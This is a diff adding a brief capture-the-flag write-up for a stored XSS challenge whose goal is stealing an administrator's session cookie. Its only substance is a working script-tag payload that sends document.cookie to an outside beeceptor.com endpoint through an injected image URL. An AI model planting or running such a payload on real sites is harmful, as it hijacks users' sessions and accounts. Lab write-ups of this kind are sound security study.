@@ -1,3 +1,11 @@
+# XSS Stored 1 - Writeup
 
-// On utilise un créateur d'endpoint (beeceptor)
+> Steal the administrator session cookie and use it to validate this chall.
+
+
+```
+
 <script>document.write('<img src="https://zidane.free.beeceptor.com/bonjour?cookie=' + document.cookie + '" />')</script>
+
+```
+
